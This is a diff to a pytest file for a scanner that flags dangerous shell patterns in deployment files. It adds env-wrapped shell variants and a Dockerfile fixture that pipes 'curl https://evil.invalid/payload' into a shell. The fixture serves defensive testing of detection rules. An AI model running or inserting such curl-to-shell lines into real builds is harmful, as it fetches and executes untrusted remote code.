@@ -99,6 +99,12 @@ def test_scan_tree_rejects_destructive_deployment_shell(tmp_path: Path, options:
         "/usr/bin/bash",
         "/usr/bin/env bash",
         "env -i bash",
+        "env - sh",
+        "env -- - sh",
+        "env -- - CLEAN=1 /bin/sh",
+        "env CLEAN=1 --unset=HOME /bin/sh",
+        "env CLEAN=1 --chdir=/tmp /bin/sh",
+        "env CLEAN=1 --unset=HOME =x /bin/sh",
         "env -i CLEAN=1 /bin/sh",
         "env -u HOME bash",
         "env --unset HOME /bin/sh",
@@ -129,6 +135,23 @@ def test_scan_tree_allows_non_combined_rm_cleanup(tmp_path: Path, command: str) 
     script = tmp_path / "cleanup.sh"
     script.write_text(f"#!/bin/sh\n{command}\n")
     assert not any(finding.rule == "SEC_SHELL_RECURSIVE_DELETE" for finding in scan_tree(tmp_path))
+
+
+@pytest.mark.parametrize(
+    "shell",
+    (
+        "env CLEAN=1 - sh",
+        "env - -- sh",
+        "env - -i sh",
+        "env - - sh",
+        "env --help - sh",
+        "env --version - sh",
+    ),
+)
+def test_scan_tree_stops_env_option_parsing_at_command(tmp_path: Path, shell: str) -> None:
+    dockerfile = tmp_path / "Dockerfile"
+    dockerfile.write_text(f"FROM python:3.11\nRUN curl https://evil.invalid/payload | {shell}\n")
+    assert not any(finding.rule == "SEC_SHELL_REMOTE_PIPE" for finding in scan_tree(tmp_path))
 
 
 def test_scan_tree_scopes_remote_source_to_current_pipeline(tmp_path: Path) -> None:
